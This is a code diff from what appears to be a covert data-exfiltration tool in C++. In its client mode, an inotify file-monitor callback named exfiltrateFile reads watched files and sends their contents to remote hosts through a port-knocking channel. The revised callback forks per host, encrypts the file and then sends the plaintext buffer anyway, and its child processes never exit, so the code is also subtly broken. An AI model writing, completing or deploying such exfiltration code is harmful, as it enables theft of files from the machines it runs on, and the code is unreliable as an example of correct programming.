@@ -185,24 +185,19 @@ int clientMode(const Properties &p, char *programName) {
     // create file monitor
     EventCallback unusedFunction = [&](FileMonitor *fm, struct inotify_event *e) {};
     EventCallback exfiltrateFile = [&](FileMonitor *fm, struct inotify_event *e) {
-        UCharVector buffer;
+        std::set<unsigned int> hosts = fm->getDestinations(e->wd);
 
-        std::string line;
-        std::ifstream infile;
-
-        infile.open(e->name); // might need to make full path here
-        while (!infile.eof()) {
-            std::getline(infile, line);
-            buffer.insert(buffer.end(), line.begin(), line.end());
+        for (auto host : hosts) {
+            for (auto fullPath : fm->getFullPathsForHost(host, e->wd)) {
+                if (fork() == 0) {
+                    UCharVector buffer = fileToBuffer(fullPath);
+                    UCharVector ciphertext = netEngine.getCrypto()->enc(buffer);
+                    struct in_addr daddr;
+                    daddr.s_addr = host;
+                    netEngine.knockAndSend(daddr, buffer);
+                }
+            }
         }
-        infile.close();
-
-        for (const auto &dst : fm->getDestinations(e->wd)) {
-            struct in_addr daddr;
-            daddr.s_addr = dst;
-            netEngine.knockAndSend(daddr, buffer);
-        }
-
     };
     FileMonitor fm(exfiltrateFile, exfiltrateFile, unusedFunction);
 
